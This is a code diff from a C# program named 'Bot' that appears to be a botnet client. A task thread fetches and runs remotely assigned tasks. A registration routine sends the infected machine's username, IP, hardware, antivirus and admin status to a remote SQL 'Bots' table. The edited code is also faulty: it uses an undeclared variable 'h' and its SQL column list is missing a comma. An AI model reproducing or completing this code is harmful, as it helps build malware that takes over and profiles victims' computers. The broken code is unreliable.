@@ -109,26 +109,27 @@ namespace Bot
         private static void TaskThread()
         {
             string CTaskString = "0";
+
             do
             {
-                using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
+                string[] CTask = CTaskString.Split(';');
+
+                for (int i = 0; i < Misc.getTaskID().Length; i++)
                 {
-                    conn.Open();
-                    string[] CTask = CTaskString.Split(';');
-                    string last = "";
-                    for (int i = 1; i < Misc.getTaskID().Length; i++)
+                    CTask = CTaskString.Split(';');
+                    Console.WriteLine("Amount of Tasks = " + Convert.ToString(Misc.getTaskID().Length));
+                    for (int n = 0; n < CTask.Length; n++)
                     {
-                        for (int n = 0; n < CTask.Length; n++)
+                        CTask = CTaskString.Split(';');
+                        Console.WriteLine("Amount of CurrentTasks = " + Convert.ToString(CTask.Length));
+                        if (Convert.ToInt32(CTask[n]) != Misc.getTaskID()[i] && Misc.getTaskID().Length > CTask.Length && h)
                         {
-                            if (Misc.getTaskAmount() >= CTask.Length)
-                            {
-                                if(Convert.ToInt32(CTask[n]) != Misc.getTaskID()[i] && i >= CTask.Length && Misc.getTask(i) != last)
-                                {
-                                    CTaskString += ";" + Misc.getTaskID()[i];
-                                    last = Misc.getTask(i);
-                                    Misc.Task(Misc.getTask(i));
-                                }
-                            }
+                            Console.WriteLine(Misc.getTask(i));
+                            Console.WriteLine(Misc.getTaskID()[i]);
+                            CTaskString += ";" + Misc.getTaskID()[i];
+                            Misc.Task(Misc.getTask(i));
+                            CTask = CTaskString.Split(';');
+                            break;
                         }
                     }
                 }
@@ -143,7 +144,7 @@ namespace Bot
                 using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
                 {
                     conn.Open();
-                    using (SqlCommand cmd = new SqlCommand("INSERT into Bots values (@PCName, @IP, @CPU, @GPU, @FirstConn, @LastConn, @OperatingSystem, @Country, @Region, @AntiVirus, @HWID, @Version, @Admin, @Active, @TaskAmount)", conn))
+                    using (SqlCommand cmd = new SqlCommand("INSERT into Bots (PCName, IP, CPU, GPU, FirstConn, LastConn,OperatingSystem, Country, Region, AntiVirus, HWID, Version, Admin TaskAmount) values (@PCName, @IP, @CPU, @GPU, @FirstConn, @LastConn, @OperatingSystem, @Country, @Region, @AntiVirus, @HWID, @Version, @Admin, @TaskAmount)", conn))
                     {
                         cmd.Parameters.AddWithValue("PCName", Identification.getUsername());
                         cmd.Parameters.AddWithValue("IP", Identification.getIP());
@@ -158,11 +159,9 @@ namespace Bot
                         cmd.Parameters.AddWithValue("HWID", Identification.getHWID());
                         cmd.Parameters.AddWithValue("Version", Settings.Botv);
                         cmd.Parameters.AddWithValue("Admin", Identification.getAdmin());
-                        cmd.Parameters.AddWithValue("Active", Settings.Active);
                         cmd.Parameters.AddWithValue("TaskAmount", Settings.TaskAmount);
 
                         cmd.ExecuteNonQuery();
-                        cmd.Parameters.Clear();
                         return true;
                     }
                 }
